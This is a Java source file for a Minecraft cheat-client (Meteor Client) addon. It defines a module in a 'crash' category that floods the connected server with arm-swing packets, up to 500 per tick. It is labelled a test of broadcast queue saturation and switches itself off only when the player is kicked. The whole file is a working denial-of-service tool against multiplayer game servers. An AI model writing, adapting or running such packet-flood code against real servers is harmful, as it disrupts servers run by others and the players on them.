package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.util.Hand;

public class ArmAnimationFlood extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Integer> swingsPerTick = sgGeneral.add(new IntSetting.Builder()
        .name("swings-per-tick").description("Arm swing packets to send each tick.")
        .defaultValue(50).range(1, 500).sliderRange(1, 200).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );

    public ArmAnimationFlood() {
        super(AddonTemplate.CRASH_CATEGORY, "arm-animation-flood",
            "Floods swing packets. Tests broadcast queue saturation.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        HandSwingC2SPacket packet = new HandSwingC2SPacket(Hand.MAIN_HAND);
        for (int i = 0; i < swingsPerTick.get(); i++) {
            mc.player.networkHandler.sendPacket(packet);
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
